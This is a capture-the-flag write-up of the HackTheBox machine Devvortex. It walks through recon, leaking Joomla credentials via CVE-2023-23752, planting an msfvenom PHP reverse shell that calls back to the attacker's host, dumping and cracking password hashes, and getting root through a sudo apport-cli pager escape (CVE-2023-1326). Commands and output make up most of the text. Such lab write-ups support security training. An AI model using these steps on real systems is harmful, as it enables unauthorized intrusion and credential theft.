---
title: HackTheBox - Devvortex
date: 2023-11-26 00:00:00
tags: [htb, ctf, writeup, hashcat, ffuf, msfvenom, mysql, linux]
category: writeups
description: htb devvortex writeup
---

# Tools

- haschat
- ffuf
- msfvenom
- mysql

<br>

## Getting User

### Nmap


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/htb/devvortex]
└─$ sudo nmap -sS -oA nmap/initial_scan 10.129.240.236                                 
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-26 11:21 EST
Nmap scan report for 10.129.240.236
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds
                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/htb/devvortex]
└─$ sudo nmap -sC -sV -p 22,80  10.129.240.236 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-26 11:29 EST
Nmap scan report for 10.129.240.236
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



<br>

### Foothold

Added vhost to *hosts* file

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/htb/devvortex]
└─$ echo '10.129.240.236 devvortex.htb' | sudo tee -a /etc/hosts                          
10.129.240.236 devvortex.htb
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Fuzzing the subdomains I found *dev* subdomain


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -c -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 192ms]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


I'm gonna add the subdomain to *hosts* file

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
10.129.240.236 devvortex.htb dev.devvortex.htb
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


I found `http://dev.devvortex.htb/robots.txt` which contains

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



`http://dev.devvortex.htb/administrator/` is a Joomla admin login page

`http://dev.devvortex.htb/administrator/manifests/files/joomla.xml` exposes version of Joomla

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<extension type="file" method="upgrade">
<name>files_joomla</name>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>(C) 2019 Open Source Matters, Inc.</copyright>
<license>
GNU General Public License version 2 or later; see LICENSE.txt
</license>
<version>4.2.6</version>
----------------------SNIPPED----------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


*Joomla 4.2.6* is vulnerable to an authentication bypass which results in information leak (*CVE-2023-23752*), which if I go to `http://dev.devvortex.htb/api/index.php/v1/config/application?public=true`, it will reveal the login credentials

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
user	"lewis"
password	"P4ntherg0t1n5r3c0n##"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Now that i'm able to login, I can gain RCE by adding a PHP payload to the template (https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla)

Created a PHP payload using msfvenom

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/htb/devvortex/files]
└─$ msfvenom -p php/meterpreter LHOST=10.10.14.107 LPORT=1234 -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2997 bytes
Saved as: shell.php
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Heading to *Sytem* > *Site Templates* > *Cassiopeeia Details and Files*
Opened `error.php`, and replaced the contents of the whole file with what's in shell.php

Listen on port 1234

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ..
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Now if I curl, we get a shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~]
└─$ curl -s http://dev.devvortex.htb/templates/cassiopeia/error.php
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Upgrading the shell to an interactive one

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.107] from (UNKNOWN) [10.129.240.236] 50866

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Upgrade shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 -c 'import pty;pty.spawn("/bin/bash")'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Found `configuration.php` file in *www*
It has Mysql info

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cat configuration.php
<?php
class JConfig {
        public $offline = false;
        public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
        public $display_offline_message = 1;
        public $offline_image = '';
        public $sitename = 'Development';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = 20;
        public $access = 1;
        public $debug = false;
        public $debug_lang = false;
        public $debug_lang_const = true;
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'lewis';
        public $password = 'P4ntherg0t1n5r3c0n##';
        public $db = 'joomla';
        public $dbprefix = 'sd4fg_';
        public $dbencryption = 0;
        public $dbsslverifyservercert = false;
        public $dbsslkey = '';
        public $dbsslcert = '';
        public $dbsslca = '';
        public $dbsslcipher = '';
        public $force_ssl = 0;
        public $live_site = '';
        public $secret = 'ZI7zLTbaGKliS9gq';
        public $gzip = false;
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        public $offset = 'UTC';
        public $mailonline = true;
        public $mailer = 'mail';
        public $mailfrom = 'lewis@devvortex.htb';
        public $fromname = 'Development';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = false;
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = 25;
        public $caching = 0;
        public $cache_handler = 'file';
        public $cachetime = 15;
        public $cache_platformprefix = false;
        public $MetaDesc = '';
        public $MetaAuthor = true;
        public $MetaVersion = false;
        public $robots = '';
        public $sef = true;
        public $sef_rewrite = false;
        public $sef_suffix = false;
        public $unicodeslugs = false;
        public $feed_limit = 10;
        public $feed_email = 'none';
        public $log_path = '/var/www/dev.devvortex.htb/administrator/logs';
        public $tmp_path = '/var/www/dev.devvortex.htb/tmp';
        public $lifetime = 15;
        public $session_handler = 'database';
        public $shared_session = false;
        public $session_metadata = true;
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Connect to Mysql

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<b/templates/cassiopeia$ mysql -u lewis -D joomla -p         
Enter password: P4ntherg0t1n5r3c0n##

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 121
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
------------------------
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-12-01 20:51:04 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Cracked the password using hashcat

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/htb/devvortex/files]
└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 3200                    

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Now i can connect to the server using logan's credentials

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~]
└─$ ssh logan@devvortex.htb                

logan@devvortex:~$ ls
user.txt
logan@devvortex:~$ cat user.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


<br>

## Getting Root

### Information Gathering


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
logan@devvortex:~$ sudo -l
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
    
logan@devvortex:~$ apport-cli -v
2.20.11
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Did some searching and found a vulnerability in this version that allows us to escalate privilege using the pager (CVE-2023-1326)

<br>

### Privilege Escalation

Open the pager by viewing the report with **V** option and enter `!sh` to escalate privilege

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
logan@devvortex:~$ sudo apport-cli python3

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
..................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (3.6 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v

2.20.11-0ubuntu27

== Architecture =================================
amd64

== CasperMD5CheckResult =================================
skip

== Date =================================
Fri Dec  1 21:48:28 2023

== Dependencies =================================
adduser 3.118ubuntu2
apt 2.0.10
apt-utils 2.0.10

libcap-ng0 0.7.9-2.1build1
libcrypt1 1:4.4.10-10ubuntu4
libdb5.3 5.3.28+dfsg1-0.6ubuntu2
libexpat1 2.2.9-1ubuntu0.6
!sh
# ls
# cd /root
# cat root.txt
ce455d27f86cab03091dd22204******
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~